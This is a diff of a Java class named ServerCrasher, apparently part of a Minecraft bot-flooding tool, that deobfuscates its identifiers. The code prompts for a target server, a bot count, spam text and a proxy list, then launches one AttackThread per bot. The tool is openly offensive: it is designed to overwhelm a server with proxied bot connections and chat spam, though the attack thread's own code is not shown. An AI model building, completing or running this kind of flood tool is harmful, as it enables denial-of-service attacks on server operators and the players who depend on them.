@@ -1,21 +1,19 @@
 package xyz.zihaoxu;
 
 import com.github.steveice10.packetlib.ProxyInfo;
-import com.github.steveice10.packetlib.tcp.TcpSession;
 import org.xbill.DNS.*;
 import org.xbill.DNS.Record;
 
 import javax.script.ScriptException;
 import java.io.*;
-import java.net.UnknownHostException;
 import java.util.Objects;
 import java.util.Scanner;
 import java.util.stream.Collectors;
 
-public class IIIIlllllI { // Class: ServerCrasher
+public class ServerCrasher { // Class: ServerCrasher
     private String[] qqqqqq; // args
     public static String dnsServer="8.8.8.8";
-    public IIIIlllllI(String[] awaaaa/*args*/){
+    public ServerCrasher(String[] awaaaa/*args*/){
         this.qqqqqq =awaaaa;
     }
 
@@ -74,8 +72,8 @@ public class IIIIlllllI { // Class: ServerCrasher
         System.out.println("解析完成:"+host+":"+port);
         // endregion
         Main.scriptManager.call("dns_resolved", host, port);
-        llllllllllII.lllIlIll =host; // Configure.host = host;
-        llllllllllII.IllIlIl =port; // Configure.port = port;
+        Configure.host =host; // Configure.host = host;
+        Configure.port =port; // Configure.port = port;
         // endregion
 
         // region 配置bot
@@ -85,13 +83,13 @@ public class IIIIlllllI { // Class: ServerCrasher
         if(aaaaawa.hasNextLine()){
             prefix=aaaaawa.nextLine();
         }
-        llllllllllII.anString =prefix;
+        Configure.name_prefix =prefix;
         System.out.print("你期望的机器人的数量: ");
         int count=100;
         if (aaaaawa.hasNextLine()){
             count= Integer.parseInt(aaaaawa.nextLine());
         }
-        llllllllllII.an114514 =count;
+        Configure.thread_count =count;
         Main.scriptManager.call("bot_configured", prefix, count);
         // endregion
 
@@ -101,15 +99,15 @@ public class IIIIlllllI { // Class: ServerCrasher
         if (aaaaawa.hasNextLine()){
             mimi= aaaaawa.nextLine();
         }
-        llllllllllII.aaawwawwa= Objects.equals(mimi, "true");
-        if (!llllllllllII.aaawwawwa) {
+        Configure.should_add_listener = Objects.equals(mimi, "true");
+        if (!Configure.should_add_listener) {
             String text = "";
             System.out.println("你希望机器人进入服务器之后发送什么内容?");
             System.out.print("留空以不发送: ");
             if (aaaaawa.hasNextLine()) {
                 text = aaaaawa.nextLine();
             }
-            llllllllllII.ananan = text;
+            Configure.spammer_text = text;
         }
 
         // region 配置代理
@@ -119,11 +117,11 @@ public class IIIIlllllI { // Class: ServerCrasher
         if (aaaaawa.hasNextLine()){
             aawaw= aaaaawa.nextLine();
         }
-        llllllllllII.aawawa=aawaw;
+        Configure.proxy_file =aawaw;
         if (aawaw!=""){
             File llIlIIl = new File(aawaw);
             BufferedReader reader=new BufferedReader(new FileReader(llIlIIl));
-            llllllllllII.aaawww=reader.lines().collect(Collectors.toList());
+            Configure.proxies =reader.lines().collect(Collectors.toList());
             System.out.println("代理的类型是?(SOCKS4/SOCKS5/HTTP)");
             System.out.print("留空默认SOCKS4: ");
             String ttttt="";
@@ -131,7 +129,7 @@ public class IIIIlllllI { // Class: ServerCrasher
                 ttttt= aaaaawa.nextLine();
             }
             if (!ttttt.isEmpty()){
-                llllllllllII.IIlllIL =ProxyInfo.Type.valueOf(ttttt.toUpperCase()); // 我不知道这样写会不会出事
+                Configure.proxy_type =ProxyInfo.Type.valueOf(ttttt.toUpperCase()); // 我不知道这样写会不会出事
                 // 反正我没给这个东西用过除了SOCKS4以外的代理
             }
         }
@@ -143,8 +141,8 @@ public class IIIIlllllI { // Class: ServerCrasher
     }
 
     public void awawa(){ // run()
-        for (int i = 0; i< llllllllllII.an114514; i++){
-            new Thread(new IIIIlllIl()).start();
+        for (int i = 0; i< Configure.thread_count; i++){
+            new Thread(new AttackThread()).start();
         }
         new Thread(new IllIll()).start();
         // 这个就是我在群里发的那个gc循环的线程
